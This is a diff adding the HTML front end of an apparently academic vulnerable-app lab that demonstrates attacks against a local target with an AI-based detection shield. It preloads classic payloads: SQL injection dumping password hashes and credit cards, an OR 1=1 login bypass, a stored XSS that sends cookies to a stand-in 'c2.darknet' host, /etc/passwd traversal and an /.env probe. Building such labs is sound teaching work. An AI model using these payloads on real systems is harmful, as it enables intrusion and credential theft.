@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NovaTech Enterprise — Vulnerable App Lab (AI Cyber Guardian Protected)</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Fira+Code:wght@400;600&display=swap" />
+  <style>
+    :root {
+      --bg: #090d16;
+      --surface: #0f172a;
+      --surface2: #1e293b;
+      --border: #334155;
+      --text: #f8fafc;
+      --muted: #94a3b8;
+      --primary: #38bdf8;
+      --success: #22c55e;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --honeypot: #d946ef;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      padding-bottom: 60px;
+    }
+    
+    /* Top Security Controller Bar */
+    .sec-bar {
+      background: #0b1120;
+      border-bottom: 1px solid var(--border);
+      padding: 12px 24px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(12px);
+    }
+    .sec-container {
+      max-width: 1240px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .shield-toggle-wrap {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .switch-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 7px 16px;
+      border-radius: 20px;
+      border: 1px solid;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .switch-protected {
+      background: rgba(34, 197, 94, 0.12);
+      border-color: var(--success);
+      color: var(--success);
+    }
+    .switch-unprotected {
+      background: rgba(239, 68, 68, 0.12);
+      border-color: var(--danger);
+      color: var(--danger);
+    }
+
+    /* Viva Exploit Quick Test Row */
+    .viva-bar {
+      background: #111827;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 10px 24px;
+    }
+    .viva-container {
+      max-width: 1240px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .viva-tag {
+      font-size: 11px;
+      font-weight: 800;
+      color: #94a3b8;
+      letter-spacing: 0.5px;
+      margin-right: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .exploit-chip {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      color: #e2e8f0;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 5px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+    .exploit-chip:hover {
+      background: rgba(56, 189, 248, 0.15);
+      border-color: var(--primary);
+      color: var(--primary);
+    }
+
+    /* Main Content Layout */
+    .main-wrap {
+      max-width: 1240px;
+      margin: 30px auto;
+      padding: 0 24px;
+    }
+    .hero-header {
+      margin-bottom: 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .hero-header h1 {
+      font-size: 28px;
+      font-weight: 800;
+      color: #ffffff;
+      margin-bottom: 6px;
+    }
+    .hero-header p {
+      font-size: 14px;
+      color: var(--muted);
+    }
+
+    /* Grid layout */
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 24px;
+      margin-bottom: 24px;
+    }
+    @media (max-width: 860px) {
+      .grid-2 { grid-template-columns: 1fr; }
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      position: relative;
+    }
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    }
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .badge-vuln {
+      font-size: 10px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 4px;
+      background: rgba(239, 68, 68, 0.15);
+      color: #f87171;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+
+    /* Inputs & Form Elements */
+    input[type="text"], input[type="password"], textarea, select {
+      width: 100%;
+      background: #090d16;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 14px;
+      color: #ffffff;
+      font-size: 13px;
+      outline: none;
+      font-family: inherit;
+      margin-bottom: 12px;
+      transition: border-color 0.2s;
+    }
+    input:focus, textarea:focus, select:focus {
+      border-color: var(--primary);
+    }
+    .btn {
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .btn-primary {
+      background: #2563eb;
+      color: #ffffff;
+    }
+    .btn-primary:hover {
+      background: #1d4ed8;
+    }
+    .btn-outline {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      color: #ffffff;
+    }
+    .btn-outline:hover {
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    /* Live Telemetry Terminal Console */
+    .terminal-box {
+      background: #05070d;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-top: 24px;
+    }
+    .terminal-topbar {
+      background: #0c1220;
+      padding: 10px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--border);
+    }
+    .terminal-dots {
+      display: flex;
+      gap: 6px;
+    }
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ef4444; }
+    .dot-yellow { background: #f59e0b; }
+    .dot-green { background: #22c55e; }
+    .terminal-body {
+      padding: 18px;
+      font-family: 'Fira Code', monospace;
+      font-size: 12px;
+      line-height: 1.6;
+      max-height: 320px;
+      overflow-y: auto;
+    }
+    .log-line { margin-bottom: 6px; }
+    .log-time { color: var(--muted); margin-right: 8px; }
+    .log-blocked { color: #f87171; font-weight: 700; }
+    .log-trapped { color: #d946ef; font-weight: 700; }
+    .log-passed { color: #4ade80; font-weight: 700; }
+    .log-alert { color: #fbbf24; font-weight: 700; }
+  </style>
+</head>
+<body>
+
+  <!-- Top Security Controller Bar -->
+  <div class="sec-bar">
+    <div class="sec-container">
+      <div style="display: flex; align-items: center; gap: 12px;">
+        <span style="font-size: 20px;">🛡️</span>
+        <div>
+          <div style="font-weight: 700; font-size: 14px; color: #ffffff;">NovaTech Enterprise Cloud</div>
+          <div style="font-size: 11px; color: var(--muted);">Live Vulnerable Target Application</div>
+        </div>
+      </div>
+
+      <!-- Shield Mode Switch -->
+      <div class="shield-toggle-wrap">
+        <span style="font-size: 12px; color: var(--muted);">AI Cyber Guardian Shield:</span>
+        <button id="shieldToggleBtn" class="switch-btn switch-protected" onclick="toggleShield()">
+          <span style="font-size: 10px;">●</span>
+          <span id="shieldStatusText">PROTECTION ACTIVE</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Viva & Examiner Exploit Quick Test Row -->
+  <div class="viva-bar">
+    <div class="viva-container">
+      <span class="viva-tag">🧪 1-CLICK VIVA EXPLOIT TESTER:</span>
+      <button class="exploit-chip" onclick="triggerPreset('sqli')">💉 SQLi (Dump Database)</button>
+      <button class="exploit-chip" onclick="triggerPreset('auth_bypass')">🔑 SQLi Auth Bypass</button>
+      <button class="exploit-chip" onclick="triggerPreset('xss')">⚡ Stored XSS Script</button>
+      <button class="exploit-chip" onclick="triggerPreset('traversal')">📂 Path Traversal (/etc/passwd)</button>
+      <button class="exploit-chip" onclick="triggerPreset('scanner')">🤖 Scanner Probe (/.env)</button>
+      <button class="exploit-chip" onclick="triggerPreset('clean')">🟢 Clean User Traffic</button>
+    </div>
+  </div>
+
+  <div class="main-wrap">
+    <div class="hero-header">
+      <div>
+        <h1>Interactive Vulnerability & Attack Demonstration Lab</h1>
+        <p>Demonstrate real-world exploits against unprotected endpoints vs. autonomous detection by AI Cyber Guardian.</p>
+      </div>
+      <div>
+        <span id="backendBadge" style="font-size: 12px; padding: 6px 12px; background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.25); color: #38bdf8; border-radius: 6px;">
+          Telemetry Target: http://localhost:8000
+        </span>
+      </div>
+    </div>
+
+    <!-- 2x2 Interactive Attack Grids -->
+    <div class="grid-2">
+
+      <!-- Endpoint 1: SQL Injection in Product Search -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">
+            <span>🔍 Enterprise Catalog Search</span>
+          </div>
+          <span class="badge-vuln">VULNERABLE TO SQLi (CWE-89)</span>
+        </div>
+        <p style="font-size: 12px; color: var(--muted); margin-bottom: 12px;">
+          Searches inventory via raw SQL. Attackers inject <code>' UNION SELECT ...</code> to extract accounts.
+        </p>
+        <div style="display: flex; gap: 8px;">
+          <input type="text" id="searchInput" placeholder="Search hardware, routers, or inject SQL payload..." value="' UNION SELECT 1, user, password_hash, credit_card FROM accounts --" />
+          <button class="btn btn-primary" onclick="submitSearch()">Search</button>
+        </div>
+        <div id="searchOutput" style="font-size: 12px; color: var(--muted); margin-top: 8px;"></div>
+      </div>
+
+      <!-- Endpoint 2: SQL Injection Auth Bypass in Login -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">
+            <span>🔐 Corporate Admin Portal</span>
+          </div>
+          <span class="badge-vuln">VULNERABLE TO AUTH BYPASS</span>
+        </div>
+        <p style="font-size: 12px; color: var(--muted); margin-bottom: 12px;">
+          Authenticates employees without parameterized queries. Exploit with <code>' OR 1=1 --</code>.
+        </p>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+          <input type="text" id="loginUser" placeholder="Username" value="admin' OR 1=1 --" />
+          <input type="password" id="loginPass" placeholder="Password" value="anything" />
+        </div>
+        <button class="btn btn-primary" style="width: 100%;" onclick="submitLogin()">Authenticate as Admin →</button>
+        <div id="loginOutput" style="font-size: 12px; color: var(--muted); margin-top: 8px;"></div>
+      </div>
+
+      <!-- Endpoint 3: Cross-Site Scripting (XSS) in Reviews -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">
+            <span>💬 Customer Review & Feedback</span>
+          </div>
+          <span class="badge-vuln">VULNERABLE TO XSS (CWE-79)</span>
+        </div>
+        <p style="font-size: 12px; color: var(--muted); margin-bottom: 12px;">
+          User feedback rendered without HTML escaping. Attackers inject malicious JavaScript payloads.
+        </p>
+        <input type="text" id="reviewAuthor" placeholder="Your Name / Title" value="Attacker (Session Stealer)" />
+        <textarea id="reviewComment" rows="2" placeholder="Write review or input XSS payload..."><script>fetch('https://c2.darknet/steal?c='+document.cookie)</script></textarea>
+        <button class="btn btn-primary" onclick="submitReview()">Submit Public Review</button>
+        <div id="reviewOutput" style="font-size: 12px; color: var(--muted); margin-top: 8px;"></div>
+      </div>
+
+      <!-- Endpoint 4: Path Traversal (LFI) in Document Archive -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">
+            <span>📂 Technical Document Viewer</span>
+          </div>
+          <span class="badge-vuln">VULNERABLE TO LFI (CWE-22)</span>
+        </div>
+        <p style="font-size: 12px; color: var(--muted); margin-bottom: 12px;">
+          Fetches PDF/manual files via path parameter. Vulnerable to dot-dot slash directory traversal.
+        </p>
+        <div style="display: flex; gap: 8px;">
+          <input type="text" id="traversalInput" placeholder="catalog.pdf, manual.txt, etc." value="../../../../etc/passwd%00" />
+          <button class="btn btn-primary" onclick="submitTraversal()">Download</button>
+        </div>
+        <div id="traversalOutput" style="font-size: 12px; color: var(--muted); margin-top: 8px;"></div>
+      </div>
+
+    </div>
+
+    <!-- Live Telemetry Terminal Console -->
+    <div class="terminal-box">
+      <div class="terminal-topbar">
+        <div style="display: flex; align-items: center; gap: 10px;">
+          <div class="terminal-dots">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-green"></div>
+          </div>
+          <span style="font-size: 12px; font-weight: 700; color: #ffffff;">
+            Real-Time Defense Telemetry Console (AI Cyber Guardian Live Stream)
+          </span>
+        </div>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 11px;" onclick="clearLogs()">Clear Console</button>
+      </div>
+      <div class="terminal-body" id="terminalLogs">
+        <div class="log-line">
+          <span class="log-time">[SYSTEM READY]</span>
+          <span style="color: #94a3b8;">NovaTech Vulnerable Target Environment initialized. Connect to Guardian Control Plane (:8000).</span>
+        </div>
+        <div class="log-line">
+          <span class="log-time">[PROTECTION ACTIVE]</span>
+          <span style="color: #38bdf8;">All endpoint requests will route through AI Threat Fusion Engine before execution.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let isShieldActive = true;
+    const CONTROL_PLANE_URL = "http://localhost:8000";
+
+    function toggleShield() {
+      isShieldActive = !isShieldActive;
+      const btn = document.getElementById("shieldToggleBtn");
+      const text = document.getElementById("shieldStatusText");
+
+      if (isShieldActive) {
+        btn.className = "switch-btn switch-protected";
+        text.innerText = "PROTECTION ACTIVE";
+        addLog("SHIELD ENABLED", "AI Cyber Guardian Dual ML + Rule Engine is now inspecting all traffic.", "log-passed");
+      } else {
+        btn.className = "switch-btn switch-unprotected";
+        text.innerText = "UNPROTECTED (VULNERABLE)";
+        addLog("SHIELD DISABLED", "Target app is raw and vulnerable. Attacks will succeed without inspection!", "log-blocked");
+      }
+    }
+
+    function addLog(tag, msg, className = "") {
+      const box = document.getElementById("terminalLogs");
+      const time = new Date().toLocaleTimeString();
+      const div = document.createElement("div");
+      div.className = "log-line";
+      div.innerHTML = `<span class="log-time">[${time}]</span> <span class="${className}">[${tag}]</span> <span style="color: #e2e8f0;">${msg}</span>`;
+      box.appendChild(div);
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function clearLogs() {
+      document.getElementById("terminalLogs").innerHTML = `
+        <div class="log-line">
+          <span class="log-time">[RESET]</span>
+          <span style="color: #94a3b8;">Console cleared. Ready for next evaluation test.</span>
+        </div>
+      `;
+    }
+
+    // 1-Click Exploit Presets for Viva Demonstration
+    function triggerPreset(type) {
+      if (type === "sqli") {
+        document.getElementById("searchInput").value = "' UNION SELECT 1, user, password_hash, credit_card FROM accounts --";
+        submitSearch();
+      } else if (type === "auth_bypass") {
+        document.getElementById("loginUser").value = "admin' OR 1=1 --";
+        document.getElementById("loginPass").value = "anything";
+        submitLogin();
+      } else if (type === "xss") {
+        document.getElementById("reviewAuthor").value = "Attacker (C2 Beacon)";
+        document.getElementById("reviewComment").value = "<script>fetch('https://c2.darknet/steal?c='+document.cookie)<\\/script>";
+        submitReview();
+      } else if (type === "traversal") {
+        document.getElementById("traversalInput").value = "../../../../etc/passwd%00";
+        submitTraversal();
+      } else if (type === "scanner") {
+        evaluateAndExecute("/.env", "GET", "", {}, () => {
+          addLog("SCANNER PROBE", "Probed /.env secrets file. Diverted to decoy surface.", "log-trapped");
+        });
+      } else if (type === "clean") {
+        document.getElementById("searchInput").value = "quantum";
+        submitSearch();
+      }
+    }
+
+    // Core Decision & Execution Pipeline
+    async function evaluateAndExecute(path, method, query, body, onSuccess) {
+      if (!isShieldActive) {
+        addLog("DIRECT HIT", `Target app received uninspected ${method} ${path}. Vulnerability executing raw!`, "log-blocked");
+        onSuccess(false);
+        return;
+      }
+
+      addLog("EVALUATING", `Analyzing ${method} ${path} via AI Cyber Guardian Threat Fusion...`, "log-alert");
+
+      try {
+        const res = await fetch("/api/guardian-proxy", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            path: path,
+            method: method,
+            query: query,
+            body: body,
+            controlPlaneUrl: CONTROL_PLANE_URL
+          })
+        });
+
+        const decision = await res.json();
+        const score = decision.score || 0;
+        const action = decision.action || "PASS";
+
+        if (action === "HONEYPOT_DIVERT") {
+          addLog("HONEYPOT DIVERT", `Threat Score: ${score}/100 [${decision.category}]. Silently diverted to In-Memory POSIX Honeypot!`, "log-trapped");
+          addLog("SOC TELEMETRY", "Adversary session recorded & dispatched to SOC Live Dashboard.", "log-passed");
+          onSuccess(true, decision);
+        } else if (action === "BLOCK") {
+          addLog("HTTP 403 BLOCKED", `Threat Score: ${score}/100. Exploit terminated by Edge Rule Engine (${decision.rule_matched || 'Malicious Payload'}).`, "log-blocked");
+          addLog("SOC TELEMETRY", "IP quarantined and logged in SOC Incident Feed.", "log-passed");
+          onSuccess(true, decision);
+        } else {
+          addLog("VERDICT: PASS", `Threat Score: ${score}/100. Traffic classified as legitimate. Forwarding upstream.`, "log-passed");
+          onSuccess(false);
+        }
+      } catch (e) {
+        addLog("FALLBACK", "Guardian evaluation failed or offline. Proceeding with caution.", "log-alert");
+        onSuccess(false);
+      }
+    }
+
+    // Handlers
+    function submitSearch() {
+      const q = document.getElementById("searchInput").value;
+      evaluateAndExecute("/api/catalog/search", "GET", `q=${encodeURIComponent(q)}`, {}, async (shielded, decision) => {
+        const out = document.getElementById("searchOutput");
+        if (shielded) {
+          out.innerHTML = `<span style="color: #38bdf8;">🛡️ Shielded by AI Cyber Guardian (${decision.action} · Score ${decision.score}/100). Exploit neutralized!</span>`;
+          return;
+        }
+        try {
+          const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`);
+          const data = await res.json();
+          if (data.status === "EXPLOIT_SUCCESSFUL_UNPROTECTED") {
+            out.innerHTML = `<span style="color: #ef4444;">🚨 ${data.warning} (${data.leaked_admin_accounts.length} admin accounts leaked!)</span>`;
+          } else {
+            out.innerHTML = `<span style="color: #22c55e;">Found ${data.count} items matching "${data.query}".</span>`;
+          }
+        } catch (e) {
+          out.innerText = "Search request dispatched.";
+        }
+      });
+    }
+
+    function submitLogin() {
+      const u = document.getElementById("loginUser").value;
+      const p = document.getElementById("loginPass").value;
+      evaluateAndExecute("/api/auth/login", "POST", "", { username: u, password: p }, async (shielded, decision) => {
+        const out = document.getElementById("loginOutput");
+        if (shielded) {
+          out.innerHTML = `<span style="color: #38bdf8;">🛡️ Shielded by AI Cyber Guardian (${decision.action} · Score ${decision.score}/100). Auth bypass stopped!</span>`;
+          return;
+        }
+        try {
+          const res = await fetch(`/api/login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username: u, password: p })
+          });
+          const data = await res.json();
+          if (data.status === "AUTH_BYPASSED_UNPROTECTED") {
+            out.innerHTML = `<span style="color: #ef4444;">🚨 ${data.warning} Granted role: ${data.user.role}</span>`;
+          } else if (data.status === "success") {
+            out.innerHTML = `<span style="color: #22c55e;">Logged in as ${data.user.username}</span>`;
+          } else {
+            out.innerHTML = `<span style="color: #f59e0b;">${data.message}</span>`;
+          }
+        } catch (e) {
+          out.innerText = "Login request dispatched.";
+        }
+      });
+    }
+
+    function submitReview() {
+      const a = document.getElementById("reviewAuthor").value;
+      const c = document.getElementById("reviewComment").value;
+      evaluateAndExecute("/api/reviews", "POST", "", { author: a, comment: c }, async (shielded, decision) => {
+        const out = document.getElementById("reviewOutput");
+        if (shielded) {
+          out.innerHTML = `<span style="color: #38bdf8;">🛡️ Shielded by AI Cyber Guardian (${decision.action} · Score ${decision.score}/100). Malicious XSS quarantined!</span>`;
+          return;
+        }
+        try {
+          const res = await fetch(`/api/reviews`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ author: a, comment: c })
+          });
+          const data = await res.json();
+          if (data.status === "STORED_XSS_UNPROTECTED") {
+            out.innerHTML = `<span style="color: #ef4444;">🚨 ${data.warning} Payload stored unescaped in DB!</span>`;
+          } else {
+            out.innerHTML = `<span style="color: #22c55e;">Review published: "${data.review.comment.substring(0, 30)}..."</span>`;
+          }
+        } catch (e) {
+          out.innerText = "Review request dispatched.";
+        }
+      });
+    }
+
+    function submitTraversal() {
+      const doc = document.getElementById("traversalInput").value;
+      evaluateAndExecute("/api/files", "GET", `doc=${encodeURIComponent(doc)}`, {}, async (shielded, decision) => {
+        const out = document.getElementById("traversalOutput");
+        if (shielded) {
+          out.innerHTML = `<span style="color: #38bdf8;">🛡️ Shielded by AI Cyber Guardian (${decision.action} · Score ${decision.score}/100). Directory traversal deflected!</span>`;
+          return;
+        }
+        try {
+          const res = await fetch(`/api/files?doc=${encodeURIComponent(doc)}`);
+          const data = await res.json();
+          if (data.status === "LFI_TRAVERSAL_UNPROTECTED") {
+            out.innerHTML = `<span style="color: #ef4444;">🚨 ${data.warning} (${data.leaked_file_contents.split('\\n')[0]})</span>`;
+          } else if (data.status === "success") {
+            out.innerHTML = `<span style="color: #22c55e;">Downloaded ${data.document} (${data.content.length} bytes)</span>`;
+          } else {
+            out.innerHTML = `<span style="color: #f59e0b;">${data.error}</span>`;
+          }
+        } catch (e) {
+          out.innerText = "Document request dispatched.";
+        }
+      });
+    }
+  </script>
+</body>
+</html>
